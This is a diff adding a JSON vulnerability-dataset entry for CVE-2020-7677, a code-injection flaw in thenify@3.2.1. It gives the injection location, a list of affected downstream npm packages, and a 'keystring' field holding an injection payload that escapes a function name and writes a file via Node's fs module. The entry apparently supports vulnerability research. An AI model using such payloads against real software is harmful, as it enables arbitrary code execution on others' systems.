@@ -1,0 +1,19 @@
+{
+  "id": "CVE-2020-7677",
+  "upstream": "thenify@3.2.1",
+  "keymethod": "#main",
+  "keystring": "fake() {\" fs=require('fs');fs.writeFileSync('thenify','',) \";})();(function(){//",
+  "location": "index.js:17:10",
+  "downstreams": [
+    "composer-common@0.17.4",
+    "@sp-temp/composer-common@0.20.14",
+    "composer-common-serverless@0.2.4",
+    "rocket-client-common@1.0.34",
+    "@zambezi/ez-build@0.6.0",
+    "npm-version-up@0.0.2",
+    "tessellate-viewer@0.1.0-alpha.2",
+    "tessellate-bundler@0.1.0",
+    "@zkochan/pnpm@0.42.0",
+    "@andreypopp/pnpm@0.50.0"
+  ]
+}
